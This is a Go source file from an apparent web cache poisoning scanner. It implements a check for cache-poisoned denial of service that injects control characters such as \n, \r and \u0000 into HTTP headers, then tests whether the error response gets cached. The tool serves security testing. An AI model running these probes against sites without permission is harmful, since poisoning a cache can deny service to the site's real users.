package cpdos

import (
	"github.com/projectdiscovery/gologger"
	"github.com/wealeson1/wcpvs/internal/logic/tecniques"
	"github.com/wealeson1/wcpvs/internal/models"
	"github.com/wealeson1/wcpvs/pkg/utils"
)

var HMCTecniques *Hmc

type Hmc struct {
	headers []string
	values  []string
}

func init() {
	HMCTecniques = NewHmc()
}

func NewHmc() *Hmc {
	return &Hmc{
		headers: []string{"X-Metachar-Header", "\\n"},
		values:  []string{"\\n", "\\r", "\\a", "\\0", "\\b", "\\e", "\\v", "\\f", "\\u0000"},
	}
}

func (h *Hmc) Scan(target *models.TargetStruct) {
	for _, header := range h.headers {
		for _, value := range h.values {
			resp, err := tecniques.GetRespNoPayload(target, tecniques.HEADER, map[string]string{header: value})
			if err != nil {
				continue
			}
			utils.CloseReader(resp.Body)
			if resp.StatusCode != target.Response.StatusCode {
				tmpReq1, err := utils.CloneRequest(resp.Request)
				if err != nil {
					gologger.Error().Msg(err.Error())
					return
				}

				for range 3 {
					resp2, err := utils.CommonClient.Do(tmpReq1)
					if err != nil {
						gologger.Error().Msgf("Hmc.Scan:%s", err.Error())
						continue
					}
					tmpReq1, err = utils.CloneRequest(resp2.Request)
					if err != nil {
						gologger.Error().Msgf("Hmc.Scan:%s", err.Error())
						continue
					}
					if utils.IsCacheHit(target, &resp2.Header) {
						gologger.Info().Msgf("The target %s has a CPDOS vulnerability, detected using Hmc. %s:%s.", target.Request.URL, header, value)
						return
					}
					utils.CloseReader(resp2.Body)
				}
			}
		}
	}
}
